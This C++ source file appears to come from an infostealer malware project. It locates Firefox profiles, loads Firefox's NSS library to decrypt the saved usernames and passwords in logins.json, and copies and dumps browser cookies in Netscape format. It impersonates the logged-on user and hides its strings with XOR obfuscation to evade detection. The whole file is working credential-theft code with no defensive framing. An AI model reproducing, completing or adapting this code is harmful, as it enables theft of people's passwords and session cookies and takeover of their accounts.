#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>

#include "FirefoxStealer.h"
#include "../crypto/Base64.h"
#include "../utils/Obfuscator.h"
#include "../utils/Shared.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <sstream>

#pragma comment(lib, "shlwapi.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
        const wchar_t kMozillaFirefoxEnc[] = { L'M'^0x4B, L'o'^0x1F, L'z'^0x8C, L'i'^0x3E, L'l'^0x4B, L'l'^0x1F, L'a'^0x8C, L' '^0x3E, L'F'^0x4B, L'i'^0x1F, L'r'^0x8C, L'e'^0x3E, L'f'^0x4B, L'o'^0x1F, L'x'^0x8C }; // Mozilla Firefox
        const wchar_t kFirefoxProfilesEnc[] = { L'M'^0x4B, L'o'^0x1F, L'z'^0x8C, L'i'^0x3E, L'l'^0x4B, L'l'^0x1F, L'a'^0x8C, L'\\'^0x3E, L'F'^0x4B, L'i'^0x1F, L'r'^0x8C, L'e'^0x3E, L'f'^0x4B, L'o'^0x1F, L'x'^0x8C, L'\\'^0x3E, L'P'^0x4B, L'r'^0x1F, L'o'^0x8C, L'f'^0x3E, L'i'^0x4B, L'l'^0x1F, L'e'^0x8C, L's'^0x3E }; // Mozilla\Firefox\Profiles
        const wchar_t kNssDllEnc[] = { L'n'^0x4B, L's'^0x1F, L's'^0x8C, L'3'^0x3E, L'.'^0x4B, L'd'^0x1F, L'l'^0x8C, L'l'^0x3E }; // nss3.dll
        const wchar_t kNssInitEnc[] = { L'N'^0x4B, L'S'^0x1F, L'S'^0x8C, L'_'^0x3E, L'I'^0x4B, L'n'^0x1F, L'i'^0x8C, L't'^0x3E }; // NSS_Init
        const wchar_t kNssShutdownEnc[] = { L'N'^0x4B, L'S'^0x1F, L'S'^0x8C, L'_'^0x3E, L'S'^0x4B, L'h'^0x1F, L'u'^0x8C, L't'^0x3E, L'd'^0x4B, L'o'^0x1F, L'w'^0x8C, L'n'^0x3E }; // NSS_Shutdown
        const wchar_t kPk11SdrDecryptEnc[] = { L'P'^0x4B, L'K'^0x1F, L'1'^0x8C, L'1'^0x3E, L'S'^0x4B, L'D'^0x1F, L'R'^0x8C, L'_'^0x3E, L'D'^0x4B, L'e'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C }; // PK11SDR_Decrypt
        const wchar_t kLoginsJsonEnc[] = { L'l'^0x4B, L'o'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L's'^0x1F, L'.'^0x8C, L'j'^0x3E, L's'^0x4B, L'o'^0x1F, L'n'^0x8C }; // logins.json
        const wchar_t kCookiesSqliteEnc[] = { L'c'^0x4B, L'o'^0x1F, L'o'^0x8C, L'k'^0x3E, L'i'^0x4B, L'e'^0x1F, L's'^0x8C, L'.'^0x3E, L's'^0x4B, L'q'^0x1F, L'l'^0x8C, L'i'^0x3E, L't'^0x4B, L'e'^0x1F }; // cookies.sqlite
        const wchar_t kQueryFxCookiesEnc[] = { L'S'^0x4B, L'E'^0x1F, L'L'^0x8C, L'E'^0x3E, L'C'^0x4B, L'T'^0x1F, L' '^0x8C, L'h'^0x3E, L'o'^0x4B, L's'^0x1F, L't'^0x8C, L','^0x3E, L' '^0x4B, L'p'^0x1F, L'a'^0x8C, L't'^0x3E, L'h'^0x4B, L','^0x1F, L' '^0x8C, L'i'^0x3E, L's'^0x4B, L'S'^0x1F, L'e'^0x8C, L'c'^0x3E, L'u'^0x4B, L'r'^0x1F, L'e'^0x8C, L','^0x3E, L' '^0x4B, L'e'^0x1F, L'x'^0x8C, L'p'^0x3E, L'i'^0x4B, L'r'^0x1F, L'y'^0x8C, L','^0x3E, L' '^0x4B, L'n'^0x1F, L'a'^0x8C, L'm'^0x3E, L'e'^0x4B, L','^0x1F, L' '^0x8C, L'v'^0x3E, L'a'^0x4B, L'l'^0x1F, L'u'^0x8C, L'e'^0x3E, L' '^0x4B, L'F'^0x1F, L'R'^0x8C, L'O'^0x3E, L'M'^0x4B, L' '^0x1F, L'm'^0x8C, L'o'^0x3E, L'z'^0x4B, L'_'^0x1F, L'c'^0x8C, L'o'^0x3E, L'o'^0x4B, L'k'^0x1F, L'i'^0x8C, L'e'^0x3E, L's'^0x4B }; // SELECT host, path, isSecure, expiry, name, value FROM moz_cookies
        const wchar_t kLoginsEnc[] = { L'l'^0x4B, L'o'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L's'^0x1F }; // logins
        const wchar_t kHostnameEnc[] = { L'h'^0x4B, L'o'^0x1F, L's'^0x8C, L't'^0x3E, L'n'^0x4B, L'a'^0x1F, L'm'^0x8C, L'e'^0x3E }; // hostname
        const wchar_t kEncryptedUsernameEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'U'^0x1F, L's'^0x8C, L'e'^0x3E, L'r'^0x4B, L'n'^0x1F, L'a'^0x8C, L'm'^0x3E, L'e'^0x4B }; // encryptedUsername
        const wchar_t kEncryptedPasswordEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'P'^0x1F, L'a'^0x8C, L's'^0x3E, L's'^0x4B, L'w'^0x1F, L'o'^0x8C, L'r'^0x3E, L'd'^0x4B }; // encryptedPassword

        typedef enum {
            SECSuccess = 0,
            SECFailure = -1
        } SECStatus;

        struct SECItem {
            unsigned int type;
            unsigned char* data;
            unsigned int len;
        };

        typedef SECStatus(*NSSInitFunc)(const char*);
        typedef SECStatus(*PK11SDRDecryptFunc)(SECItem*, SECItem*, void*);
        typedef SECStatus(*NSSShutdownFunc)();

        std::string FindFirefoxInstallPath() {
            char path[MAX_PATH];
            std::string mozillaFirefox = utils::ws2s(utils::DecryptW(kMozillaFirefoxEnc, sizeof(kMozillaFirefoxEnc)/sizeof(kMozillaFirefoxEnc[0])));
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path))) {
                std::string p = std::string(path) + "\\" + mozillaFirefox;
                if (fs::exists(p)) return p;
            }
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, path))) {
                std::string p = std::string(path) + "\\" + mozillaFirefox;
                if (fs::exists(p)) return p;
            }
            return "";
        }

        std::vector<std::string> FindFirefoxProfiles() {
            std::vector<std::string> profiles;
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
                fs::path profilesPath = fs::path(path) / utils::ws2s(utils::DecryptW(kFirefoxProfilesEnc, sizeof(kFirefoxProfilesEnc)/sizeof(kFirefoxProfilesEnc[0])));
                if (fs::exists(profilesPath)) {
                    for (const auto& entry : fs::directory_iterator(profilesPath)) {
                        if (entry.is_directory()) {
                            profiles.push_back(entry.path().string());
                        }
                    }
                }
            }
            return profiles;
        }

        std::string DecryptNSS(const std::string& base64Data, PK11SDRDecryptFunc decryptFunc) {
            std::vector<BYTE> encrypted = crypto::Base64Decode(base64Data);
            if (encrypted.empty()) return "";

            SECItem input = { 0, encrypted.data(), (unsigned int)encrypted.size() };
            SECItem output = { 0, nullptr, 0 };

            if (decryptFunc(&input, &output, nullptr) == SECSuccess) {
                std::string decrypted((char*)output.data, output.len);
                // NSS allocates memory that should be freed with SECITEM_FreeItem or similar,
                // but since we don't have all headers, we just hope it's standard heap or leak it once.
                return decrypted;
            }
            return "";
        }

        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            CopyFileA(src.c_str(), dest.c_str(), FALSE);
            // Also copy sidecars if they exist (WAL mode)
            std::string wal = src + "-wal";
            std::string shm = src + "-shm";
            if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
            if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
        }

        void SafeDeleteDatabase(const std::string& path) {
            DeleteFileA(path.c_str());
            DeleteFileA((path + "-wal").c_str());
            DeleteFileA((path + "-shm").c_str());
        }
    }

    std::string DumpFirefoxPasswords() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::string report = "FIREFOX_PASSWORDS_DUMPED:\n";
        if (!impersonated) report += "[!] Impersonation failed.\n";

        std::string firefoxPath = FindFirefoxInstallPath();
        if (firefoxPath.empty()) {
            if (impersonated) utils::RevertToSelf();
            return report + "Firefox installation not found.";
        }

        std::vector<std::string> profiles = FindFirefoxProfiles();
        if (profiles.empty()) {
            if (impersonated) utils::RevertToSelf();
            return report + "No Firefox profiles found.";
        }

        std::string nssDllPath = firefoxPath + "\\" + utils::ws2s(utils::DecryptW(kNssDllEnc, sizeof(kNssDllEnc)/sizeof(kNssDllEnc[0])));
        HMODULE hNss = LoadLibraryExA(nssDllPath.c_str(), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
        if (!hNss) {
            if (impersonated) utils::RevertToSelf();
            return report + "Failed to load nss from " + firefoxPath;
        }

        auto nssInit = (NSSInitFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kNssInitEnc, sizeof(kNssInitEnc)/sizeof(kNssInitEnc[0]))).c_str());
        auto nssShutdown = (NSSShutdownFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kNssShutdownEnc, sizeof(kNssShutdownEnc)/sizeof(kNssShutdownEnc[0]))).c_str());
        auto pk11SdrDecrypt = (PK11SDRDecryptFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kPk11SdrDecryptEnc, sizeof(kPk11SdrDecryptEnc)/sizeof(kPk11SdrDecryptEnc[0]))).c_str());

        if (!nssInit || !pk11SdrDecrypt) {
            FreeLibrary(hNss);
            if (impersonated) utils::RevertToSelf();
            return report + "Failed to find NSS functions.";
        }

        report += "PROFILE | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";
        
        bool foundAny = false;

        for (const auto& profile : profiles) {
            fs::path loginsPath = fs::path(profile) / utils::ws2s(utils::DecryptW(kLoginsJsonEnc, sizeof(kLoginsJsonEnc)/sizeof(kLoginsJsonEnc[0])));
            if (!fs::exists(loginsPath)) continue;

            // NSS usually needs "sql:" prefix for modern versions
            std::string nssPath = "sql:" + profile;
            if (nssInit(nssPath.c_str()) != SECSuccess) {
                // Fallback to direct path
                if (nssInit(profile.c_str()) != SECSuccess) continue;
            }

            try {
                std::ifstream f(loginsPath);
                nlohmann::json j;
                f >> j;

                std::string loginsKey = utils::ws2s(utils::DecryptW(kLoginsEnc, sizeof(kLoginsEnc)/sizeof(kLoginsEnc[0])));
                if (j.contains(loginsKey)) {
                    for (const auto& login : j[loginsKey]) {
                        std::string url = login.value(utils::ws2s(utils::DecryptW(kHostnameEnc, sizeof(kHostnameEnc)/sizeof(kHostnameEnc[0]))), "N/A");
                        std::string encUser = login.value(utils::ws2s(utils::DecryptW(kEncryptedUsernameEnc, sizeof(kEncryptedUsernameEnc)/sizeof(kEncryptedUsernameEnc[0]))), "");
                        std::string encPass = login.value(utils::ws2s(utils::DecryptW(kEncryptedPasswordEnc, sizeof(kEncryptedPasswordEnc)/sizeof(kEncryptedPasswordEnc[0]))), "");

                        std::string username = DecryptNSS(encUser, pk11SdrDecrypt);
                        std::string password = DecryptNSS(encPass, pk11SdrDecrypt);

                        if (!username.empty() || !password.empty()) {
                            report += fs::path(profile).filename().string() + " | " + url + " | " + username + " | " + password + "\n";
                            foundAny = true;
                        }
                    }
                }
            } catch (...) {}

            if (nssShutdown) nssShutdown();
        }

        FreeLibrary(hNss);

        if (impersonated) utils::RevertToSelf();
        if (!foundAny) return report + "No passwords found in Firefox profiles.";
        return report;
    }

    std::string StealFirefoxCookies() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::string report = "# FIREFOX COOKIE STEALER RESULTS\n";
        if (!impersonated) report += "# [!] Impersonation failed.\n";

        std::vector<std::string> profiles = FindFirefoxProfiles();
        if (profiles.empty()) {
            if (impersonated) utils::RevertToSelf();
            return report + "No Firefox profiles found to steal cookies from.";
        }

        std::stringstream resultSS;
        resultSS << report;
        
        int cookieCount = 0;

        for (const auto& profile : profiles) {
            fs::path cookiesDbPath = fs::path(profile) / utils::ws2s(utils::DecryptW(kCookiesSqliteEnc, sizeof(kCookiesSqliteEnc)/sizeof(kCookiesSqliteEnc[0])));
            if (!fs::exists(cookiesDbPath)) continue;

            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            std::string tempDb = std::string(tempPath) + "cfx_" + std::to_string(GetTickCount64()) + ".sqlite";
            
            SafeCopyDatabase(cookiesDbPath.string(), tempDb);

            sqlite3* db;
            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                std::string query_str = utils::ws2s(utils::DecryptW(kQueryFxCookiesEnc, sizeof(kQueryFxCookiesEnc)/sizeof(kQueryFxCookiesEnc[0])));
                const char* query = query_str.c_str();
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                        const char* path = (const char*)sqlite3_column_text(stmt, 1);
                        int isSecure = sqlite3_column_int(stmt, 2);
                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                        const char* name = (const char*)sqlite3_column_text(stmt, 4);
                        const char* value = (const char*)sqlite3_column_text(stmt, 5);
                        
                        // Format: domain flag path secure expiry name value
                        resultSS << (host ? host : "") << "\t"
                                 << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
                                 << (path ? path : "") << "\t"
                                 << (isSecure ? "TRUE" : "FALSE") << "\t"
                                 << expiry << "\t"
                                 << (name ? name : "") << "\t"
                                 << (value ? value : "") << "\n";
                        
                        cookieCount++;
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            SafeDeleteDatabase(tempDb);
        }

        if (impersonated) utils::RevertToSelf();
        if (cookieCount == 0) return report + "No cookies found in Firefox profiles.";
        
        std::stringstream finalOut;
        finalOut << "# Total cookies extracted: " << cookieCount << "\n";
        finalOut << "# Netscape HTTP Cookie File Format\n#\n";
        finalOut << resultSS.str();
        
        return finalOut.str();
    }

}
